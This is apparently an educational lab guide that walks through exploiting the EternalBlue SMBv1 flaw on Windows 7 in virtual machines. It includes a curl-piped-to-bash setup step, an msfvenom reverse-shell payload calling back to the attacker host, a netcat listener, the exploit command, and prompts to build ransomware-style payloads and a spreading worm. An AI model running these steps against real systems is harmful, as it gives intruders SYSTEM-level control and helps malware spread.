# EternalBlue

- Built on: Environment: Kali Linux(2020.3) and Vulnerable Windows 7(64bit) VMs (2020.09)

# Objectives:
-	To simulate the Eternal Blue attack by exploiting SMBv1 (Server Message Block) vulnerabilities which inserts malicious packet and spread malware over the network.


## Preparation

- On Linux: `curl -fsSL https://raw.githubusercontent.com/j-liang18/fh18c/main/eternalblue/install.sh | bash`

- On Windows: merge https://raw.githubusercontent.com/j-liang18/fh18c/main/eternalblue/install.reg ([zip](https://raw.githubusercontent.com/j-liang18/fh18c/main/eternalblue/install.reg.zip))

## Steps

1. Create a sharing folder on victim’s computer:
 * 	Open Windows VM (`target.example.com`).
 *	Create a new folder or select any folder to share.
 *	Right click on the folder -> Properties -> Sharing tab -> Advanced Sharing.
 *	In Advanced Sharing, select `Share this folder` -> OK -> Close.
2. Prepare a payload on attacker’s computer: ( You can create your own payload)
   We will use msfvenom command to create a reverse shell and name it ms17-010.exe.
 *	Open Linux VM (`kali.example.com`).
 *	Open a terminal.
 *	Use command: `msfvenom -p windows/shell_reverse_tcp LHOST=kali.example.com LPORT=8443 EXITFUNC=thread -f exe -a x86 --platform windows -o ms17-010.exe`
3. Scanning for vulnerabilities:
   We omit the step to probe the victim and identify the vulnerabilities since we already know about it. You can read more about this step on the references.
4. Exploit the vulnerabilities:
 *	Open a new terminal window (to create a listener for the exploitation).
 * 	Use command: `nc -nlvp 8443`
 *	On the first terminal, start exploitation script: `python send_and_execute.py target.example.com ms17-010.exe`
5. Now your payload is running on the victim machine under `NT AUTHORITY\SYSTEM` privilege. We omit the step to verify that.
6. On the second terminal, You should get an inbound connection on your netcat server listening on port 8443, providing you with a shell (cmd). Every command you enter is executed on the victim machine. Switch between two VMs to control on the attacker’s computer and see the change on victim’s computer.

## Exploration

1.	Inspect the Python scripts and related docs (protocol spec) to understand the exploitation:
 Use these question for  deeper understanding:
 *	How the smb protocol (Windows file sharing service) and server work?
 *	What the flaw is? How it is exploited? And how to fix it? etc.
2.	Design your own payload (like the ransomware in the news events, but you're not limited to ransomwares and can do anything on the victim. The guide in the reference proceeds with extracting login credentials from the system manually in the reverse shell).
3.	Think about implementing an exploit inside the payload, and the ability to probe other hosts reachable over the network, attack them and spread itself. This can be used to create a computer worm and/or botnet (discussed elsewhere).


## Reference

- [Exploiting MS17-010 without Metasploit (Win XP SP3)](https://ivanitlearning.wordpress.com/2019/02/24/exploiting-ms17-010-without-metasploit-win-xp-sp3/)
